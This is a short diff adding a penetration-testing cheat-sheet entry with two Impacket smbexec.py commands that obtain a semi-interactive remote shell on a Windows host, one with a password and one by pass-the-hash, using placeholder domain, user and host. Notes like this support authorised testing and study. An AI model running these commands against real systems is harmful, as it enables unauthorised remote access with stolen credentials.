@@ -1,0 +1,6 @@
+# get semi interactive shell
+python smbexec.py <domain>/<user>:<password>@<rhost>
+
+# using hash
+python smbexec.py -hashes <hash> <domain>/<user>@<rhost>
+
